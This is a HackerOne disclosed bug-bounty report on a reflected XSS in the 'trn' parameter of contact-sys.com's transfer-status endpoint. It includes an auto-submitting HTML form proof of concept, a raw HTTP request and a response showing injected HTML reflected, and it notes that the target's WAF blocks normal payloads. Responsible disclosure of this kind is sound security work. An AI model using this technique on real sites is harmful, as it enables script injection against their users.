---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '164704'
original_report_id: '164704'
title: '[contact-sys.com] XSS /ajax/transfer/status trn param'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: qiwi
created_at: '2016-08-31T12:20:17.100Z'
disclosed_at: '2018-11-18T07:26:17.672Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 21
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [contact-sys.com] XSS /ajax/transfer/status trn param

## Metadata

- HackerOne Report ID: 164704
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: qiwi
- Disclosed At: 2018-11-18T07:26:17.672Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Уязвимый сценарий:** https://contact-sys.com/ajax/transfer/status
**Уязвимый параметр:** trn

Некорректный content-type. Нормальный пейлоад блокируется WAFом.

**PoC**

```html
<html>
  <body>
    <form id="xss" action="https://contact-sys.com/ajax/transfer/status" method="POST">
      <input type="hidden" name="trndate" value="01&#46;08&#46;2016" />
      <input type="hidden" name="trn" value="<s><h1><marquee>XSS" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
<script>document.getElementById("xss").submit();</script>
```

**HTTP Request**
```http
POST /ajax/transfer/status HTTP/1.1
Host: contact-sys.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Cookie: PHPSESSID=l9ofcg7b8ehhshvsi6okbaa2d0; _ym_uid=1472633286349849091; _ym_isad=2; _ga=GA1.2.258776393.1472633287
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

trndate=01.08.2016&trn=%3Cs%3E%3Ch1%3E%3Cmarquee%3EXSS
```

**HTTP Response**
```html
{"result":1,"out":"\u0412\u0430\u0448 \u043f\u0435\u0440\u0435\u0432\u043e\u0434 <strong><s><h1><marquee>XSS<\/strong> <span class=\"red\">\u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d<\/span>,<br\/>\u0442\u0430\u043a \u043a\u0430\u043a \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e \u0432\u0432\u0435\u0434\u0435\u043d\u044b \u0434\u0430\u043d\u043d\u044b\u0435 \u0438\u043b\u0438 \u0435\u0433\u043e \u043d\u0435\u0442 \u0432 \u0441\u0438\u0441\u0442\u0435\u043c\u0435 CONTACT.","erased":0,"alotof":0}
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
